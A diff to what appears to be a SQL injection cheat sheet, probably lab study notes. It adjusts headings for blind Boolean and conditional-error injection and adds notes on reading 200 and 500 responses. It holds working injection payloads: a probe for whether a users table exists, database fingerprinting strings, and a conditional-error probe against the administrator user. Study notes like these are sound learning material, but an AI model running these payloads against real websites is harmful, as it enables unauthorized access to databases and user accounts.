@@ -46,7 +46,7 @@
 
 
 
-#Blind based Boolean SQL injection with conditional responses
+#Blind based Boolean SQL injection with conditional responses (Visible message)
 
 ' and (select 'x' from users LIMIT 1)='x'-- - >> To determine if the [users] table is exist or not.
 
@@ -58,11 +58,11 @@
 
 
 
-#Blind SQL injection with conditional errors
+#Blind SQL injection with conditional errors (No visible message)
 
 ' || (select ' ') || ' >> Non Oracle
 
-' || (select ' ' from dual) || ' >> Oracle
+' || (select ' ' from dual) || ' >> Oracle #200 ok means Oracle database exists.
 
 select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' >> Oracle #500 error means exists.
 
